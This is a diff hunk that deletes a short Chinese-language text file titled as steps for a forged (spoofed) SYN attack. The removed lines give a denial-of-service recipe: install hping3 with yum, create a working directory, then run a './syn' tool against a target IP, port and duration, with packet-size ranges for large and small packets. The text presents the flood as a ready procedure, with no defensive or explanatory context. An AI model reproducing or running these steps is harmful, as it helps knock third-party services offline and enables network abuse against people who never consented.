@@ -1,8 +1,0 @@
-国内伪造SYN步骤
-1:安装hping3
-命令:yum install -y hping3
-2:创建一个目录
-命令:mkdir s&&cd s
-3:攻击
-./syn 2 IP 端口 时间 包大小
-(大包520以上-1400，小包128-520)
